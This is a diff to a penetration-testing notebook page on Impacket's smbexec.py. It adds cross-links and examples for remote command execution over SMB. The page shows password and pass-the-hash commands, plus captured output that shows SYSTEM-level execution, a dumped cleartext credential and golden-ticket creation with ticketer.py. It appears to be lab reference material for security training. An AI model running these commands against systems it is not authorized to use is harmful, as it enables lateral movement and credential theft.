@@ -9,6 +9,38 @@ hideFooterPagination: true
 
 {/* Generated from Commands/smbexec.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## smbexec.py: choose the operation and read the result
+
+Execute commands through Windows services over SMB; requires service-control rights.
+
+### What the result establishes
+
+Identify the remote execution identity and whether output is being retrieved from the expected share.
+
+### Prerequisites and common failures
+
+This method uses service-control operations; share access alone does not establish the required rights.
+
+### Example 1: Password (prompted)
+
+Run in: **Kali**.
+
+```bash
+impacket-smbexec 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 2: NT hash
+
+Run in: **Kali**.
+
+```bash
+impacket-smbexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
+```
+
+## Saved commands and notebook recipes
+
+Execute commands through Windows services over SMB; requires service-control rights.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=smbexec) · [All tools](/index)
@@ -21,6 +53,13 @@ Replace UPPER_CASE values with your lab values.
 impacket-smbexec 'DOMAIN/USER@TARGET_IP'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Example 1: Password (prompted)](/tools/psexec#example-1-password-prompted-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 ## NT hash
 
 **Kali**
@@ -28,6 +67,13 @@ impacket-smbexec 'DOMAIN/USER@TARGET_IP'
 ```bash
 impacket-smbexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Example 2: NT hash](/tools/psexec#example-2-nt-hash-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -51,6 +97,13 @@ SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d
 SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
 SMB         10.10.110.17 445    WIN7BOX  nt authority\system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — CrackMapExec](/modules/common-services/full-reference#crackmapexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -96,6 +149,13 @@ proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
 [*] Cleaning up...
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py](/active-directory/dcsync-lab#extracting-ntlm-hashes-and-kerberos-keys-using-secretsdump-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Original captured examples">
@@ -120,6 +180,13 @@ ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   #
 smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="From SMB access to remote code execution">
@@ -135,6 +202,13 @@ impacket-wmiexec <user>:'<pass>'@<IP>            # over WMI, fileless (stealthie
 impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SMB Enumeration and Shares — From SMB access to remote code execution](/enumeration/smb-enumeration-server-message-block#from-smb-access-to-remote-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="smbexec.py">
@@ -147,6 +221,13 @@ impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
 impacket-smbexec 'example.local/administrator@192.0.2.10'
 impacket-smbexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — smbexec.py](/tools/windows-remote-execution#smbexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -162,6 +243,21 @@ Context from the notebook: SMB service execution smbexec.py  /  impacket-smbexec
 smbexec.py
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples) · [Windows remote execution by service — Choose a tool](/tools/windows-remote-execution#choose-a-tool)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows remote execution by service](/tools/windows-remote-execution)
+
+{/* VAULT_RELATED_END */}
